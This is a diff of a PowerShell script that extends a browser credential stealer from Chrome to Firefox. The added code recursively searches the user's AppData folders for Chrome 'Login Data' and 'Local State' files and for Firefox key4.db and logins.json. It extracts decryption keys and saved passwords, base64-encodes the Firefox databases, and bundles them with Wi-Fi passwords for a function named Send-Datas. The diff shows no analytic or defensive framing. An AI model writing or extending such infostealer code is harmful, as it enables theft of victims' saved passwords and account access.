@@ -49,7 +49,7 @@ Add-Type @"
   }
 "@
 
-Function Get-Key {
+Function Get-ChromeKey {
   param (
     [Parameter(mandatory=$true)]
     [string] $file
@@ -63,7 +63,7 @@ Function Get-Key {
   return $master_key
 }
 
-function Get-Passwords {
+function Get-ChromePasswords {
   param (
     [Parameter(mandatory=$true)]
     [string] $file
@@ -94,34 +94,51 @@ function Get-Passwords {
   return $($res | ConvertTo-Json -Compress)
 }
 
-function Find-PasswordsFilesChrome {
+function Find-Files {
+  $files = @{
+    LoginData = "Login Data"
+    LocalState = "Local State"
+    Key4Db = "key4.db"
+    LoginsJson = "logins.json"
+  }
+
   $res = @{}
-  $res.keys = New-Object System.Collections.Generic.List[System.Object]
-  $res.contents = New-Object System.Collections.Generic.List[System.Object]
-  $tmp_file = "$Env:Temp\$((New-GUID).GUID)"
-  Get-ChildItem -Path "$Env:AppData", "$Env:LocalAppData" -Recurse -File -include ("Login Data", "Local State") |
+  $res.chrome = @{}
+  $res.firefox = @{}
+  $res.chrome.keys = New-Object System.Collections.Generic.List[System.Object]
+  $res.chrome.contents = New-Object System.Collections.Generic.List[System.Object]
+  $res.firefox.key4 = New-Object System.Collections.Generic.List[System.Object]
+  $res.firefox.logins = New-Object System.Collections.Generic.List[System.Object]
+  Get-ChildItem -Path "$Env:AppData", "$Env:LocalAppData" -Recurse -File -include ($files.LoginData, $files.LocalState, $files.Key4Db, $files.LoginsJson) |
   %{
-    Copy-Item "$_" -Destination $tmp_file
+    $tmp_file = "$Env:Temp\$((New-GUID).GUID)"
+    Copy-Item "$_" -Destination $tmp_file -Force
     if ($?) {
       switch ($($_.Name)) {
-        "Login Data" {
-          $tmp = $(Get-Passwords $tmp_file | ConvertFrom-Json)
+        $files.LoginData {
+          $tmp = $(Get-ChromePasswords $tmp_file | ConvertFrom-Json)
           if ($tmp.raw -ne $null) {
-            $res.contents.Add($tmp.raw)
+            $res.chrome.contents.Add($tmp.raw)
           }
           break
         }
-        "Local State" {
-          $key = Get-Key $tmp_file
+        $files.LocalState {
+          $key = Get-ChromeKey $tmp_file
           if ($key -ne $null) {
-            $res.keys.Add($key)
+            $res.chrome.keys.Add($key)
           }
           break
+        }
+        $files.Key4Db {
+          $res.firefox.key4.Add([Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp_file)))
+        }
+        $files.LoginsJson {
+          $res.firefox.logins.Add([Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp_file)))
         }
       }
     }
   }
-  return $($res | ConvertTo-Json -Depth 3 -Compress)
+  return $($res | ConvertTo-Json -Depth 4 -Compress)
 }
 
 function Get-WifiPasswordsFiles {
@@ -140,8 +157,8 @@ function Get-Datas {
   $res = @{}
   $tmp = Get-WifiPasswordsFiles
   $res.wifi = $($tmp | ConvertFrom-Json).raw
-  $res.chrome = Find-PasswordsFilesChrome | ConvertFrom-Json
-  return $($res | ConvertTo-Json -Depth 4)
+  $res.browser = Find-Files | ConvertFrom-Json
+  return $($res | ConvertTo-Json -Depth 5)
 }
 
 function Send-Datas {
